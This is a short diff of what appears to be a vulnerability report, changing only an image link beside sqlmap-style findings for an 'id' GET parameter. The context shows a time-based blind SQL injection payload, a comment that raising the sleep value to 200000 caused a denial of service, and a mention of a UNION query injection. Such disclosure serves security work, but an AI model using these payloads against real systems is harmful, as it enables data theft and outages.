@@ -63,7 +63,7 @@ Parameter: id (GET)
     Payload: id=3' AND (SELECT 8396 FROM (SELECT(SLEEP(5)))PBWw) AND 'pCMl'='pCMl
 
     Comments after testing: Changed (SlEEP(5))))PBWw) to SLEEP(200000))))PBWw and it created a Denial of Service for the time   set. 
-    ![Denial of Service after SQL injection  ](https://user-images.githubusercontent.com/111711434/200113022-4ab3ce4f-24d2-498a-b6fb-23d47637d3f5.png)
+![Denial of Service after SQL injection  ](https://user-images.githubusercontent.com/111711434/200140448-3da3ba36-f3b6-4bcf-a079-b24d6592906c.png)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 5 columns
